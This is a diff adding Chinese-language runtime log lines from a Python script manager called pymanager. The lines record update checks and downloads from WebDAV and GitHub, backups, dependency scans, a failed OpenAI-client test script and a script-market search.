+[2026-04-28 23:15:00] 当前已是最新版本 v1.8.9
+[2026-04-28 23:24:10] ─── 框架依赖检查 ───
+[2026-04-28 23:24:10] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:24:10] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:24:13] [WebDAV] 检查更新: https://dav.jianguoyun.com/dav/pymanager/version.json
+[2026-04-28 23:24:13] [WebDAV] 最新版本: 1.8.9, 下载链接: https://dav.jianguoyun.com/dav/pymanager/pymanager-1.8.9.zip
+[2026-04-28 23:24:13] 当前已是最新版本 v1.8.9
+[2026-04-28 23:24:24] [WebDAV] 检查更新: https://dav.jianguoyun.com/dav/pymanager/version.json
+[2026-04-28 23:24:24] [WebDAV] 最新版本: 1.8.9, 下载链接: https://dav.jianguoyun.com/dav/pymanager/pymanager-1.8.9.zip
+[2026-04-28 23:24:24] 当前已是最新版本 v1.8.9
+[2026-04-28 23:24:27] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmpwzfn2dlp\pymanager-1.8.9.zip
+[2026-04-28 23:24:27] 开始下载文件，URL: https://dav.jianguoyun.com/dav/pymanager/pymanager-1.8.9.zip
+[2026-04-28 23:24:27] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmpwzfn2dlp\pymanager-1.8.9.zip
+[2026-04-28 23:24:27] [WebDAV] 使用 WebDAV 下载
+[2026-04-28 23:24:27] [WebDAV] 开始下载: https://dav.jianguoyun.com/dav/pymanager/pymanager-1.8.9.zip
+[2026-04-28 23:24:27] [错误] WebDAV下载失败: HTTP Error 404: Not Found
+[2026-04-28 23:24:27] 下载失败，已打开浏览器进行手动下载
+[2026-04-28 23:27:19] ─── 框架依赖检查 ───
+[2026-04-28 23:27:19] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:27:19] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:27:22] [WebDAV] 检查更新: https://dav.jianguoyun.com/dav/pymanager/version.json
+[2026-04-28 23:27:22] [错误] WebDAV更新检查失败: HTTP Error 401: Unauthorized
+[2026-04-28 23:27:22] [WebDAV] 回退到其他更新源
+[2026-04-28 23:27:23] [GitHub] 最新版本: 1.8.9, 下载链接: https://api.github.com/repos/zhangyapu1/pymanager/zipball/v1.8.9
+[2026-04-28 23:27:23] 当前已是最新版本 v1.8.9
+[2026-04-28 23:27:25] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmpnd79414m\v1.8.9.zip
+[2026-04-28 23:27:25] 开始下载文件，URL: https://api.github.com/repos/zhangyapu1/pymanager/zipball/v1.8.9
+[2026-04-28 23:27:25] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmpnd79414m\v1.8.9.zip
+[2026-04-28 23:27:27] 下载中... (8192 bytes)
+[2026-04-28 23:27:27] 下载中... (16384 bytes)
+[2026-04-28 23:27:27] 下载中... (24576 bytes)
+[2026-04-28 23:27:27] 下载中... (32768 bytes)
+[2026-04-28 23:27:27] 下载中... (40960 bytes)
+[2026-04-28 23:27:27] 下载中... (49152 bytes)
+[2026-04-28 23:27:27] 下载中... (57344 bytes)
+[2026-04-28 23:27:28] 下载中... (65536 bytes)
+[2026-04-28 23:27:28] 下载中... (73728 bytes)
+[2026-04-28 23:27:28] 下载中... (81920 bytes)
+[2026-04-28 23:27:28] 下载中... (90112 bytes)
+[2026-04-28 23:27:28] 下载中... (98304 bytes)
+[2026-04-28 23:27:28] 下载中... (106496 bytes)
+[2026-04-28 23:27:28] 下载中... (114688 bytes)
+[2026-04-28 23:27:28] 下载中... (122880 bytes)
+[2026-04-28 23:27:28] 下载中... (131072 bytes)
+[2026-04-28 23:27:28] 下载中... (139264 bytes)
+[2026-04-28 23:27:28] 下载中... (147456 bytes)
+[2026-04-28 23:27:28] 下载中... (155648 bytes)
+[2026-04-28 23:27:28] 下载中... (163840 bytes)
+[2026-04-28 23:27:28] 下载中... (172032 bytes)
+[2026-04-28 23:27:28] 下载中... (180224 bytes)
+[2026-04-28 23:27:28] 下载中... (188416 bytes)
+[2026-04-28 23:27:28] 下载中... (196608 bytes)
+[2026-04-28 23:27:28] 下载中... (204800 bytes)
+[2026-04-28 23:27:28] 下载中... (212992 bytes)
+[2026-04-28 23:27:28] 下载中... (221184 bytes)
+[2026-04-28 23:27:28] 下载中... (229376 bytes)
+[2026-04-28 23:27:28] 下载中... (237568 bytes)
+[2026-04-28 23:27:28] 下载中... (245760 bytes)
+[2026-04-28 23:27:28] 下载中... (253952 bytes)
+[2026-04-28 23:27:28] 下载中... (262144 bytes)
+[2026-04-28 23:27:28] 下载中... (270336 bytes)
+[2026-04-28 23:27:28] 下载中... (278528 bytes)
+[2026-04-28 23:27:28] 下载中... (286720 bytes)
+[2026-04-28 23:27:28] 下载中... (294912 bytes)
+[2026-04-28 23:27:28] 下载中... (303104 bytes)
+[2026-04-28 23:27:28] 下载中... (311296 bytes)
+[2026-04-28 23:27:28] 下载中... (319488 bytes)
+[2026-04-28 23:27:28] 下载中... (327680 bytes)
+[2026-04-28 23:27:28] 下载中... (335872 bytes)
+[2026-04-28 23:27:28] 下载中... (344064 bytes)
+[2026-04-28 23:27:28] 下载中... (352256 bytes)
+[2026-04-28 23:27:28] 下载中... (360448 bytes)
+[2026-04-28 23:27:28] 下载中... (368640 bytes)
+[2026-04-28 23:27:28] 下载中... (376832 bytes)
+[2026-04-28 23:27:28] 下载中... (385024 bytes)
+[2026-04-28 23:27:28] 下载中... (393216 bytes)
+[2026-04-28 23:27:28] 下载中... (401408 bytes)
+[2026-04-28 23:27:28] 下载中... (409600 bytes)
+[2026-04-28 23:27:28] 下载中... (416270 bytes)
+[2026-04-28 23:27:28] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmpnd79414m\v1.8.9.zip
+[2026-04-28 23:27:28] 下载完成，开始应用更新
+[2026-04-28 23:27:28] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 23:27:28] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 23:27:28] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmpnd79414m\v1.8.9.zip
+[2026-04-28 23:27:28] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_09.zip
+[2026-04-28 23:27:28] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_09.zip
+[2026-04-28 23:27:28] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_09.zip
+[2026-04-28 23:27:28] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmpg7ri2qbp
+[2026-04-28 23:27:28] 检测到单目录压缩包，使用子目录：zhangyapu1-pymanager-4664e8d
+[2026-04-28 23:27:28] 已删除废弃文件: .gitignore
+[2026-04-28 23:27:28] 共清理 1 个废弃文件
+[2026-04-28 23:27:29] 文件覆盖完成，准备重启...
+[2026-04-28 23:27:29] 已创建更新脚本：C:\Users\ahdsz\AppData\Local\Temp\pymanager_update.bat
+[2026-04-28 23:27:29] 更新脚本已启动，当前程序即将退出
+[2026-04-28 23:27:35] ─── 框架依赖检查 ───
+[2026-04-28 23:27:35] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:27:35] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:36:20] ─── 框架依赖检查 ───
+[2026-04-28 23:36:20] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:36:20] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:36:23] [WebDAV] 检查更新: https://dav.jianguoyun.com/dav/pymanager/version.json
+[2026-04-28 23:36:23] [WebDAV] 最新版本: 1.8.9, 下载链接: https://dav.jianguoyun.com/dav/pymanager/pymanager-1.8.9.zip
+[2026-04-28 23:36:23] 当前已是最新版本 v1.8.9
+[2026-04-28 23:56:39] ─── 框架依赖检查 ───
+[2026-04-28 23:56:39] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:56:39] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:56:40] [WebDAV] 检查更新: https://dav.jianguoyun.com/dav/pymanager/version.json
+[2026-04-28 23:56:40] [错误] WebDAV更新检查失败: HTTP Error 401: Unauthorized
+[2026-04-28 23:56:40] [WebDAV] 回退到 GitHub
+[2026-04-28 23:56:42] [GitHub] 最新版本: 1.8.9, 下载链接: https://api.github.com/repos/zhangyapu1/pymanager/zipball/v1.8.9
+[2026-04-28 23:56:42] 当前已是最新版本 v1.8.9
+[2026-04-28 23:56:51] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmpqs3z1t8c\v1.8.9.zip
+[2026-04-28 23:56:51] 开始下载文件，URL: https://api.github.com/repos/zhangyapu1/pymanager/zipball/v1.8.9
+[2026-04-28 23:56:51] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmpqs3z1t8c\v1.8.9.zip
+[2026-04-28 23:56:53] 下载中... (8192 bytes)
+[2026-04-28 23:56:53] 下载中... (16384 bytes)
+[2026-04-28 23:56:53] 下载中... (24576 bytes)
+[2026-04-28 23:56:53] 下载中... (32768 bytes)
+[2026-04-28 23:56:53] 下载中... (40960 bytes)
+[2026-04-28 23:56:53] 下载中... (49152 bytes)
+[2026-04-28 23:56:53] 下载中... (57344 bytes)
+[2026-04-28 23:56:53] 下载中... (65536 bytes)
+[2026-04-28 23:56:53] 下载中... (73728 bytes)
+[2026-04-28 23:56:53] 下载中... (81920 bytes)
+[2026-04-28 23:56:53] 下载中... (90112 bytes)
+[2026-04-28 23:56:53] 下载中... (98304 bytes)
+[2026-04-28 23:56:53] 下载中... (106496 bytes)
+[2026-04-28 23:56:53] 下载中... (114688 bytes)
+[2026-04-28 23:56:53] 下载中... (122880 bytes)
+[2026-04-28 23:56:53] 下载中... (131072 bytes)
+[2026-04-28 23:56:53] 下载中... (139264 bytes)
+[2026-04-28 23:56:53] 下载中... (147456 bytes)
+[2026-04-28 23:56:53] 下载中... (155648 bytes)
+[2026-04-28 23:56:53] 下载中... (163840 bytes)
+[2026-04-28 23:56:53] 下载中... (172032 bytes)
+[2026-04-28 23:56:53] 下载中... (180224 bytes)
+[2026-04-28 23:56:53] 下载中... (188416 bytes)
+[2026-04-28 23:56:53] 下载中... (196608 bytes)
+[2026-04-28 23:56:53] 下载中... (204800 bytes)
+[2026-04-28 23:56:53] 下载中... (212992 bytes)
+[2026-04-28 23:56:53] 下载中... (221184 bytes)
+[2026-04-28 23:56:53] 下载中... (229376 bytes)
+[2026-04-28 23:56:53] 下载中... (237568 bytes)
+[2026-04-28 23:56:53] 下载中... (245760 bytes)
+[2026-04-28 23:56:53] 下载中... (253952 bytes)
+[2026-04-28 23:56:53] 下载中... (262144 bytes)
+[2026-04-28 23:56:53] 下载中... (270336 bytes)
+[2026-04-28 23:56:53] 下载中... (278528 bytes)
+[2026-04-28 23:56:53] 下载中... (286720 bytes)
+[2026-04-28 23:56:53] 下载中... (294912 bytes)
+[2026-04-28 23:56:53] 下载中... (303104 bytes)
+[2026-04-28 23:56:53] 下载中... (311296 bytes)
+[2026-04-28 23:56:53] 下载中... (319488 bytes)
+[2026-04-28 23:56:53] 下载中... (327680 bytes)
+[2026-04-28 23:56:53] 下载中... (335872 bytes)
+[2026-04-28 23:56:53] 下载中... (344064 bytes)
+[2026-04-28 23:56:53] 下载中... (352256 bytes)
+[2026-04-28 23:56:53] 下载中... (360448 bytes)
+[2026-04-28 23:56:53] 下载中... (368640 bytes)
+[2026-04-28 23:56:53] 下载中... (376832 bytes)
+[2026-04-28 23:56:53] 下载中... (385024 bytes)
+[2026-04-28 23:56:53] 下载中... (393216 bytes)
+[2026-04-28 23:56:53] 下载中... (401408 bytes)
+[2026-04-28 23:56:53] 下载中... (409600 bytes)
+[2026-04-28 23:56:53] 下载中... (416270 bytes)
+[2026-04-28 23:56:53] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmpqs3z1t8c\v1.8.9.zip
+[2026-04-28 23:56:53] 下载完成，开始应用更新
+[2026-04-28 23:56:53] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 23:56:53] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 23:56:53] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmpqs3z1t8c\v1.8.9.zip
+[2026-04-28 23:56:53] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_10.zip
+[2026-04-28 23:56:54] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_10.zip
+[2026-04-28 23:56:54] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_10.zip
+[2026-04-28 23:56:54] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmp1fd5u_0v
+[2026-04-28 23:56:54] 检测到单目录压缩包，使用子目录：zhangyapu1-pymanager-4664e8d
+[2026-04-28 23:56:54] 已删除废弃文件: .gitignore
+[2026-04-28 23:56:54] 共清理 1 个废弃文件
+[2026-04-28 23:56:54] 文件覆盖完成，准备重启...
+[2026-04-28 23:56:54] 已创建更新脚本：C:\Users\ahdsz\AppData\Local\Temp\pymanager_update.bat
+[2026-04-28 23:56:54] 更新脚本已启动，当前程序即将退出
+[2026-04-28 23:57:00] ─── 框架依赖检查 ───
+[2026-04-28 23:57:00] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:57:00] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:58:53] ─── 框架依赖检查 ───
+[2026-04-28 23:58:53] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:58:53] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:58:55] [WebDAV] 检查更新: https://dav.jianguoyun.com/dav/pymanager/version.json
+[2026-04-28 23:58:55] [错误] WebDAV更新检查失败: HTTP Error 401: Unauthorized
+[2026-04-28 23:58:55] [WebDAV] 回退到 GitHub
+[2026-04-28 23:58:56] [GitHub] 最新版本: 1.8.9, 下载链接: https://api.github.com/repos/zhangyapu1/pymanager/zipball/v1.8.9
+[2026-04-28 23:58:56] 当前已是最新版本 v1.8.9
+[2026-04-28 23:59:57] ─── 框架依赖检查 ───
+[2026-04-28 23:59:57] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 23:59:57] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 23:59:59] [WebDAV] 检查更新: https://dav.jianguoyun.com/dav/pymanager/version.json
+[2026-04-28 23:59:59] [WebDAV] 最新版本: 1.8.9, 下载链接: https://dav.jianguoyun.com/dav/pymanager/pymanager-1.8.9.zip
+[2026-04-28 23:59:59] 当前已是最新版本 v1.8.9
+[2026-04-29 00:14:16] ─── 框架依赖检查 ───
+[2026-04-29 00:14:16] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-29 00:14:16] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-29 00:14:27] 📄 test_local_ai.py
+[2026-04-29 00:14:27] （该脚本无头注释）
+[2026-04-29 00:14:28] ─── 脚本「test_local_ai.py」依赖检查 ───
+[2026-04-29 00:14:28] 扫描到的所有导入：openai
+[2026-04-29 00:14:28] 第三方依赖：openai
+[2026-04-29 00:14:28] 
+[2026-04-29 00:14:28]   openai: 已安装
+[2026-04-29 00:14:28] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-29 00:14:29] 所有依赖已满足
+[2026-04-29 00:14:29] 
+[2026-04-29 00:14:29] 开始运行：test_local_ai.py
+[2026-04-29 00:14:29] 运行路径：test_local_ai.py
+[2026-04-29 00:14:29] 
+[2026-04-29 00:14:30] Traceback (most recent call last):
+[2026-04-29 00:14:30]   File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\test_local_ai.py", line 8, in <module>
+[2026-04-29 00:14:30]     response = client.chat.completions.create(
+[2026-04-29 00:14:30]         model="",
+[2026-04-29 00:14:30]     ...<2 lines>...
+[2026-04-29 00:14:30]         ]
+[2026-04-29 00:14:30]     )
+[2026-04-29 00:14:30]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\_utils\_utils.py", line 287, in wrapper
+[2026-04-29 00:14:30]     return func(*args, **kwargs)
+[2026-04-29 00:14:30]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\resources\chat\completions\completions.py", line 1211, in create
+[2026-04-29 00:14:30]     return self._post(
+[2026-04-29 00:14:30]            ~~~~~~~~~~^
+[2026-04-29 00:14:30]         "/chat/completions",
+[2026-04-29 00:14:30]         ^^^^^^^^^^^^^^^^^^^^
+[2026-04-29 00:14:30]     ...<47 lines>...
+[2026-04-29 00:14:30]         stream_cls=Stream[ChatCompletionChunk],
+[2026-04-29 00:14:30]         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-04-29 00:14:30]     )
+[2026-04-29 00:14:30]     ^
+[2026-04-29 00:14:30]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\_base_client.py", line 1314, in post
+[2026-04-29 00:14:30]     return cast(ResponseT, self.request(cast_to, opts, stream=stream, stream_cls=stream_cls))
+[2026-04-29 00:14:30]                            ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-04-29 00:14:30]   File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\openai\_base_client.py", line 1087, in request
+[2026-04-29 00:14:31]     raise self._make_status_error_from_response(err.response) from None
+[2026-04-29 00:14:31] openai.BadRequestError: Error code: 400 - {'error': {'message': 'Missing required field: model', 'type': 'invalid_request_error', 'param': 'model', 'code': None}}
+[2026-04-29 00:14:31] 运行完成：test_local_ai.py，退出码：1
+[2026-04-29 00:14:32] 📄 PDF批处理工具.py
+[2026-04-29 00:14:32] ────────────────────────────────────────
+[2026-04-29 00:14:32] PDF 批处理工具 - 批量合并、拆分和转换 PDF 文件。
+
+功能：
+- 合并 PDF：将多个 PDF 文件合并为一个文件
+- 拆分 PDF：将一个 PDF 按页码范围拆分为多个文件
+- 提取页面：从 PDF 中提取指定页面
+- 添加水印：为 PDF 添加文字水印（支持自定义文字、颜色、透明度、角度）
+- 页面旋转：旋转 PDF 页面（90°/180°/270°）
+- 删除页面：删除 PDF 中的指定页面
+
+界面：
+- 左侧文件列表：支持拖拽添加文件，可调整顺序
+- 右侧操作面板：选择操作类型和参数
+- 底部输出目录：记忆上次输出目录
+- 进度条显示处理进度
+
+配置：
+- 输出目录记忆：保存到 config/pdf_tool.json
+- 水印参数记忆：上次使用的水印文字、颜色等
+
+依赖：PyMuPDF, reportlab, pypdf
+[2026-04-29 00:14:33] 📄 test_local_ai.py
+[2026-04-29 00:14:33] （该脚本无头注释）
+[2026-04-29 00:14:36] 正在删除：test_local_ai.py
+[2026-04-29 00:14:36] 已移除：test_local_ai.py
+[2026-04-29 00:14:39] [脚本市场] 搜索：python script tool
+[2026-04-29 00:14:42] [脚本市场] 找到 8707 个仓库
+[2026-04-29 00:14:44] [脚本市场] 选中仓库：InstaPy/InstaPy - 📷 Instagram Bot - Tool for automated Instagram interactions
+[2026-04-29 00:14:45] [脚本市场] README 为英文，自动翻译中...
+[2026-04-29 00:14:53] [脚本市场] README 翻译完成
+[2026-04-29 00:15:03] [脚本市场] AI 分析完成：InstaPy/InstaPy
+[2026-04-29 00:15:15] [提示] 当前没有保存的 Token。
